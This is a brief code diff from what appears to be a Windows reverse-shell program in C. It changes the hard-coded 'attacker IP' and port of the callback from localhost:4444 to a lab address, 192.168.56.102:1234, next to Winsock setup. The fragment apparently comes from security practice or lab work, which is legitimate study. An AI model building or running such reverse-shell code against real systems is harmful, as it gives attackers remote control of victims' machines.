@@ -9,8 +9,8 @@ int main() {
     struct sockaddr_in server;
     
     // set the variables to use IE: attacker IP to connect to and port to connect to
-    char *server_ip = "127.0.0.1"; 
-    int server_port = 4444; 
+    char *server_ip = "192.168.56.102"; 
+    int server_port = 1234; 
     
     // init Winsock
     WSAStartup(MAKEWORD(2,2), &wsa);
